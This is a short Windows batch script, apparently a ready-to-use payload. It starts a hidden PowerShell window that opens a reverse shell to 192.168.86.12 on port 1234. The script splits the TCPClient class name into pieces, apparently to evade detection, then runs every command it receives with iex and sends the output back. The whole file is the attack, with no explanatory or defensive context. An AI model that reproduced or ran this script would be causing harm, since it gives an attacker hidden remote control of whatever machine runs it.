@echo off
powershell -NoP -W Hidden -C "$x = 'Sy'+'stem.Net.Sock'+'ets.TC'+'PClient'; $client = New-Object ($x)('192.168.86.12',1234); $stream = $client.GetStream(); [byte[]]$bytes = New-Object byte[] 1024; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()"
